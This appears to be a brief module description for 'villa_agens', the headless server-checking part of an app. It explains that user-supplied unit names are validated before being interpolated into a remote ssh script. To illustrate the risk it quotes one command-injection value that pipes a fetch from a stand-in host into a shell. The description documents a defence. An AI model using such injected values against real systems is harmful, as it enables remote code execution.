villa_agens

Agens villae: probatio, actio, eventus.

The part of villa (the servers app) that has no face: configuration, the remote check script, the check cycle, the seeds of its record kinds, writing events. It lives in lib/ rather than apps/villa/ so that the root test suite covers it, because a gate that cannot turn green is ignored. Nothing blocks: every check runs through processus's incremental path and villa_agens_pulsare returns at once each tick. The header sets out the shell question plainly: locally no shell is ever used; remotely ssh necessarily runs a shell, so unit names coming from the user's own records are checked by villa_unitas_valida before they are interpolated into the script (a unit named 'x; curl evil|sh' would otherwise run), and a refused name is left out of the check. The ssh control directory is created 0700. From July 2026.
